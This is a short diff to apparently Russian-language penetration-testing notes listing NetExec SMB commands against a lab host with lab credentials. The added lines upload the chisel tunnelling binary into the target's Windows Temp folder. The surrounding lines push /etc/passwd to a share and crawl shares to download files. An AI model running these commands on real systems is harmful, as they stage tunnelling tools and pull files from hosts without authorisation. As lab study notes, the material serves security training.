@@ -179,6 +179,9 @@
 	# Отправка файла в общую папку
 	nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --put-file /etc/passwd passwd [--smb-timeout 3]
 
+	# Отправка файла по пути
+	nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 
+
 	# список файлов доступных пользователю c загрукзой
 	mxc smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
 
